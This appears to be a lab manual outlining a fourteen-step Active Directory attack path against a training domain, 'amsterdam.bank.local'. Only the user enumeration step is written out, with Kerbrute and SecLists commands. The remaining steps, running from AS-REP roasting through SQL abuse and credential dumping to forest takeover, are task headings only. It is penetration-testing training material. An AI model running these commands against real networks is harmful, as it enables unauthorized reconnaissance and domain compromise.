# Manual

## Attack path visualized

![](<../../../../.gitbook/assets/image (68).png>)

### 1. Enumerate Users

**Task: Enumerate valid domain users.**

It is possible to enumerate valid domain users by sending TGT requests to the DC. One tool to do this is [Kerbrute](https://github.com/ropnop/kerbrute). But before we can use this tool we need a list of valid usernames. A repository with a lot of lists for these kind of things is [SecLists](https://github.com/danielmiessler/SecLists).

1. Download the required tools:

```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute
git clone https://github.com/danielmiessler/SecLists
```

2\. After downloading the tool and the username list, run Kerbrute against the domain `amsterdam.bank.local` and DC `10.0.0.3`. Pipe the command to `tee` to save the output to the txt file `username_enum.txt`.&#x20;

```
./kerbrute userenum -d amsterdam.bank.local --dc 10.0.0.3 /opt/SecLists/Usernames/xato-net-10-million-usernames.txt | tee username_enum.txt
```

![](<../../../../.gitbook/assets/image (72).png>)

3\. To only get a list of usernames execute the following which will cut the output to only get the usernames, changes everything to lowercase and sorting for unique entries:

```
cat username_enum.txt | grep bank.local | cut -d " " -f 8- | cut -d "@" -f 1 | sed 's/./\L&/g' | sort -u > users.txt
```

```
cat users.txt                                                                                                       
administrator
bank
bob
chris
dave
david
john
mark
mike
richard
robert
steve
thomas
```

### 2. AS-REP roast

**Task: Check if any of the valid users are vulnerable to a kerberos vulnerability.**



### 3. Access SQL Server

**Task: Check if the user can access any system or service.**



### 4. Become sysadmin

**Task: Escalate privileges to sysadmin.**



### 5. Execute commands

**Task: Get a shell.**



### 6. Privesc RBCD

**Task: Escalate privileges on the machine with a delegation attack.**



### 7. Abuse SQL Link

**Task: Enumerate SQL Links to hop across trusts.**



### 8. UNC Path injection

**Task: Perform a UNC Path injection and capture the hash of SQL Service user.**



### 9. Crack SQL account hash

**Task: Crack the hash of the SQL service user.**



### 10. ACL - Write Owner & RCBCD

**Task: Check for ACL's and get access to the system.**



### 11. Dumping DPAPI

**Task: Look for saved credentials on the machine (DPAPI).**



### 12. Privileged groups

**Task: Become domain admin by abusing the "Backup Operators" group.**



### 13. Kerberoast

**Task: Check for interesting user attributes across the trust to `bank.local`.**



### 14. Take over Foresat

**Task: Take over the `bank.local` forest.**

